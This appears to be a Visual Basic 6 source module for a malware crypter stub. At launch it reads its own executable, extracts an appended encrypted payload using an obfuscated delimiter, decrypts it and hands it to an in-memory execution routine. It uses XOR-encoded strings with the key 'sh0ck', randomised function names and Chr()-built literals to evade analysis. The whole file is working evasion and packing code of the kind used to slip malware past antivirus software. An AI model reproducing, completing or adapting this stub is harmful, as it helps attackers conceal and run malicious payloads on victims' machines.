Attribute VB_Name = "Module1"
Option Explicit

Public Type ENCRYPTCLASS
  Name As String
  Object As Object
  Homepage As String
End Type
Public afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3Objects() As ENCRYPTCLASS
Public afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3ObjectsCount As Long

Public Const BENCHMARKSIZE = 1000000

Private Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Dim QWERTYUIOP As String, ZXCVBNM() As String, ÑLKJHGFDSA As New Class1, m3m0 As Integer
Private Sub Main()
Call EBPEDETdsVdeG
End Sub

Sub EBPEDETdsVdeG()
m3m0 = FreeFile
Open App.Path & hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(47), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)) & App.EXEName & hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(93) & Chr(13) & Chr(72) & Chr(6), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)) For Binary As #m3m0
QWERTYUIOP = Space(LOF(m3m0))
Get #m3m0, , QWERTYUIOP
Close #m3m0
ZXCVBNM() = iawq2o0gnsc2ie2porlepkz2j3jiyhngrmwslshwxynt02krfn(QWERTYUIOP, afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(StrReverse(hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(82) & Chr(73) & Chr(5) & Chr(74) & Chr(66) & Chr(90) & Chr(65) & Chr(25) & Chr(74) & Chr(66) & Chr(90) & Chr(65) & Chr(25) & Chr(74) & Chr(66) & Chr(90) & Chr(65) & Chr(25), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)))))
Call ROOOOOOOOOOOOOOOOOOOOOOOOOOON(App.Path & hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(47), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)) & App.EXEName & hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(Chr(93) & Chr(13) & Chr(72) & Chr(6), Chr(115) & Chr(104) & Chr(48) & Chr(99) & Chr(107)), StrConv(ÑLKJHGFDSA.gytkyqw9dijmj9ywmoxc6hiv9pn8zbhz88fke81bwlh0do1min(ZXCVBNM(1), ZXCVBNM(2)), vbFromUnicode), Command)
End Sub
Function afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3(t)
Dim i
On Error Resume Next
For i = 1 To Len(t)
afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3 = afgq4xbi1opfzll3j1jyzpqu3866u03dmpm9fb1oh8gb3aryo3 & Chr(Asc(Mid(t, i, 6)) Xor 9 - 1)
Next
End Function

Public Function mxf56k17sixdqck0vunkk7pgxa1zbijywifusdg643vtgxj5rr(Filename As String) As Boolean
  On Error GoTo NotExist
  
  Call FileLen(Filename)
  mxf56k17sixdqck0vunkk7pgxa1zbijywifusdg643vtgxj5rr = True
  Exit Function
  
NotExist:
End Function

Public Static Sub GetWord(LongValue As Long, CryptBuffer() As Byte, Offset As Long)
'  Call CopyMem(LongValue, CryptBuffer(Offset), 4)
  
  Dim bb(0 To 3) As Byte
  
  bb(3) = CryptBuffer(Offset)
  bb(2) = CryptBuffer(Offset + 1)
  bb(1) = CryptBuffer(Offset + 2)
  bb(0) = CryptBuffer(Offset + 3)
  Call CopyMem(LongValue, bb(0), 4)
End Sub

Public Static Sub PutWord(LongValue As Long, CryptBuffer() As Byte, Offset As Long)
'  Call CopyMem(CryptBuffer(Offset), LongValue, 4)

  Dim bb(0 To 3) As Byte

  Call CopyMem(bb(0), LongValue, 4)
  CryptBuffer(Offset) = bb(3)
  CryptBuffer(Offset + 1) = bb(2)
  CryptBuffer(Offset + 2) = bb(1)
  CryptBuffer(Offset + 3) = bb(0)
End Sub

Public Static Function u66hlbrdye7im9aiylhhm0uidpla9rr1po7ggdoi1xilze6tbt(ByVal Data1 As Long, Data2 As Long) As Long
  Dim x1(0 To 3) As Byte
  Dim x2(0 To 3) As Byte
  Dim xx(0 To 3) As Byte
  Dim Rest As Long
  Dim Value As Long
  Dim a As Long
  
  Call CopyMem(x1(0), Data1, 4)
  Call CopyMem(x2(0), Data2, 4)
  
  Rest = 0
  For a = 0 To 3
    Value = CLng(x1(a)) + CLng(x2(a)) + Rest
    xx(a) = Value And 255
    Rest = Value \ 256
  Next
  
  Call CopyMem(u66hlbrdye7im9aiylhhm0uidpla9rr1po7ggdoi1xilze6tbt, xx(0), 4)
End Function

Public Function laphnktfcajx5guvtug1welbwu8w5k7xlrwxaw8aj7c4tnc1j8(Data1 As Long, Data2 As Long) As Long
  Dim x1(0 To 3) As Byte
  Dim x2(0 To 3) As Byte
  Dim xx(0 To 3) As Byte
  Dim Rest As Long
  Dim Value As Long
  Dim a As Long
  
  Call CopyMem(x1(0), Data1, 4)
  Call CopyMem(x2(0), Data2, 4)
  Call CopyMem(xx(0), laphnktfcajx5guvtug1welbwu8w5k7xlrwxaw8aj7c4tnc1j8, 4)
  
  For a = 0 To 3
    Value = CLng(x1(a)) - CLng(x2(a)) - Rest
    If (Value < 0) Then
      Value = Value + 256
      Rest = 1
    Else
      Rest = 0
    End If
    xx(a) = Value
  Next
  
  Call CopyMem(laphnktfcajx5guvtug1welbwu8w5k7xlrwxaw8aj7c4tnc1j8, xx(0), 4)
End Function




'----------------------
'Xor Function
'----------------------
Public Function hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1(ByVal sStr As String, ByVal sKey As String) As String
Dim i As Long
    For i = 1 To Len(sStr)
        hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1 = hj8smodpp73km6cee9vi64c8y45ofg032bn17jk2269q5mvpn1 & Chr(Asc(Mid(sKey, IIf(i Mod Len(sKey) <> 0, i Mod Len(sKey), Len(sKey)), 1)) Xor Asc(Mid(sStr, i, 1)))
    Next i
End Function



